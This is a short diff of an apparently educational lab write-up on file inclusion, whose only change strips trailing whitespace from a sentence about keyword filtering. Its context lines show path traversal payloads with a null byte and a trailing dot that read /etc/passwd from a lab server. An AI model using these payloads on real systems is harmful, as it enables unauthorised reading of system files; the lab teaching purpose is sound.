@@ -218,7 +218,7 @@ Now apply this technique in Lab #4 and figure out to read `/etc/passwd`.
 
 Accessing either `http://10.10.84.111/lab4.php?file=../../../etc/passwd%00` or `http://10.10.84.111/lab4.php?file=../../../etc/passwd/.` gives us the file contents in Lab #4.
 
-**Lab #5** - Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. 
+**Lab #5** - Next, in the following scenarios, the developer starts to use input validation by filtering some keywords.
 
 Let's test out and check the error message!
 
